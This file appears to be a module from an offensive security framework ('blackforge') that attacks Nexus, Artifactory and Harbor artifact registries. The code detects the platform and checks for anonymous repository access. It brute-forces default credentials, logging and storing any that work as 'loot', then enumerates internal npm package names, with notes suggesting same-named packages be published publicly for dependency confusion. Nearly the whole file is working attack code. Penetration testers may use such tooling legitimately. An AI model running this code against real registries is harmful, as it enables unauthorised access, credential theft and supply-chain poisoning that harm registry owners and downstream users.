"""Artifact registry exploitation: Nexus/Artifactory/Harbor anonymous access,
default credential testing, dependency confusion detection."""

from __future__ import annotations

from typing import Any, Dict, List

from blackforge.logger import log
from blackforge.models import AttackResult, Credential, EngagementContext
from blackforge.modules.base import BaseModule
from blackforge.utils.http import request
from blackforge.data.credentials import ARTIFACT_DEFAULT_CREDS
from blackforge.data.endpoints import ARTIFACT_PATHS


class ArtifactModule(BaseModule):

    name = "artifact"

    def run(self, ctx: EngagementContext, **kwargs: Any) -> List[AttackResult]:
        url: str = kwargs.get("url", "")
        username: str = kwargs.get("username", "")
        password: str = kwargs.get("password", "")

        results: List[AttackResult] = []
        base = url.rstrip("/")
        ctx.loot.setdefault("artifact", {})

        platform = self._detect_platform(ctx, base)
        log(f"[Artifact] Detected platform: {platform} at {base}", "INFO")
        ctx.loot["artifact"]["platform"] = platform

        results.extend(self._check_anonymous_access(ctx, base, platform))
        results.extend(self._brute_default_creds(ctx, base, platform, username, password))
        results.extend(self._check_dependency_confusion(ctx, base, platform))
        return results

    def _detect_platform(self, ctx: EngagementContext, base: str) -> str:
        for platform, paths in ARTIFACT_PATHS.items():
            resp = request(ctx, "GET", f"{base}{paths[0]}")
            if resp and resp.status_code in (200, 401, 403):
                return platform
        return "unknown"

    def _check_anonymous_access(self, ctx: EngagementContext, base: str,
                                platform: str) -> List[AttackResult]:
        anon_findings: List[Dict[str, Any]] = []
        platform_endpoints = {
            "nexus": "/service/rest/v1/repositories",
            "artifactory": "/api/repositories",
            "harbor": "/api/v2.0/projects",
        }
        endpoint = platform_endpoints.get(platform)
        if not endpoint:
            return []

        resp = request(ctx, "GET", f"{base}{endpoint}")
        if resp and resp.ok:
            data = resp.json() if isinstance(resp.json(), list) else []
            log(f"[Artifact/{platform}] Anonymous access! {len(data)} items", "CRIT")
            anon_findings.append({"type": f"{platform}_repos", "count": len(data)})
            ctx.loot["artifact"]["repos"] = data

        if anon_findings:
            return [AttackResult(
                "artifact", "anon_access", "SUCCESS", target=base,
                severity="HIGH", data=anon_findings,
                notes=f"{platform} allows anonymous read. Supply chain risk.",
            )]
        return []

    def _brute_default_creds(self, ctx: EngagementContext, base: str,
                             platform: str, username: str,
                             password: str) -> List[AttackResult]:
        creds = [(username, password)] if username and password else ARTIFACT_DEFAULT_CREDS
        auth_path = {
            "nexus": "/service/rest/v1/repositories",
            "artifactory": "/api/system/info",
            "harbor": "/api/v2.0/systeminfo",
        }.get(platform, "/")

        for user, passwd in creds:
            resp = request(ctx, "GET", f"{base}{auth_path}", auth=(user, passwd))
            if resp and resp.ok:
                log(f"[Artifact/{platform}] Default creds: {user}:{passwd}", "CRIT")
                ctx.credentials.append(Credential(
                    f"{platform}_credential",
                    {"username": user, "password": passwd},
                    f"artifact:{platform}:{base}",
                    f"Default credentials for {platform}",
                ))
                return [AttackResult(
                    "artifact", "default_creds", "SUCCESS", target=base,
                    severity="CRITICAL",
                    data={"platform": platform, "user": user},
                    notes=f"{platform} admin access via {user}:{passwd}.",
                )]
        return [AttackResult(
            "artifact", "default_creds", "FAILED", target=base,
            notes=f"No default credentials worked for {platform}",
        )]

    def _check_dependency_confusion(self, ctx: EngagementContext, base: str,
                                    platform: str) -> List[AttackResult]:
        internal_packages: List[str] = []
        if platform == "nexus":
            resp = request(ctx, "GET",
                           f"{base}/service/rest/v1/assets?repository=npm-internal&limit=20")
            if resp and resp.ok:
                for item in resp.json().get("items", [])[:10]:
                    internal_packages.append(item.get("name", ""))
        elif platform == "artifactory":
            resp = request(ctx, "GET",
                           f"{base}/api/search/artifact?name=*&repos=npm-local&limit=10")
            if resp and resp.ok:
                for r in resp.json().get("results", [])[:10]:
                    internal_packages.append(r.get("name", ""))

        if internal_packages:
            ctx.loot["artifact"]["internal_packages"] = internal_packages
            return [AttackResult(
                "artifact", "dep_confusion", "SUCCESS", target=base,
                severity="HIGH", data={"packages": internal_packages},
                notes=f"Internal packages found: {internal_packages[:5]}. "
                      f"Publish same-named packages to public registries for dependency confusion.",
            )]
        return [AttackResult(
            "artifact", "dep_confusion", "PARTIAL",
            notes="Could not enumerate internal packages. Try with credentials.",
        )]
